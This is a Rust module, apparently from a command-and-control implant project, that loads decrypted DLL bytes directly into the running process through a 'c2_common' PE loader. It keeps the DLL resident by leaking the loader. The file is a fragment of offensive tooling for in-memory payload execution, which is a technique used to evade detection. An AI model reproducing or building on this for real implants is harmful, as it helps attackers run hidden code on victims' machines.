//! DLL Loading module
//!
//! Uses c2_common's PE loader to load DLLs into memory (self-injection).

/// Load a DLL from raw bytes into the current process
/// 
/// Uses the PE loader from c2_common to:
/// 1. Parse the PE
/// 2. Allocate memory
/// 3. Map sections
/// 4. Apply relocations
/// 5. Resolve imports
/// 6. Call DllMain
/// 
/// # Arguments
/// * `dll_bytes` - The raw (decrypted) DLL bytes
/// 
/// # Returns
/// * `Ok(base_address)` - The base address where the DLL was loaded
/// * `Err(error_message)` - Error description if loading failed
#[cfg(windows)]
pub fn load_dll_from_bytes(dll_bytes: &[u8]) -> Result<usize, String> {
    use c2_common::pe::loader::PeLoader;
    
    // Basic validation
    if dll_bytes.len() < 64 {
        return Err("DLL too small".to_string());
    }
    
    // Check DOS header magic
    if dll_bytes[0] != 0x4D || dll_bytes[1] != 0x5A {
        return Err("Invalid DOS header (not MZ)".to_string());
    }
    
    // Load the DLL using PE loader
    let loader = unsafe {
        PeLoader::load(dll_bytes).map_err(|e| e.to_string())?
    };
    
    let base_addr = loader.base_address() as usize;
    
    // Important: We need to keep the DLL loaded, so we forget the loader
    // to prevent its Drop from unloading the DLL
    std::mem::forget(loader);
    
    Ok(base_addr)
}

/// Stub for non-Windows platforms
#[cfg(not(windows))]
pub fn load_dll_from_bytes(_dll_bytes: &[u8]) -> Result<usize, String> {
    Err("DLL loading is only supported on Windows".to_string())
}
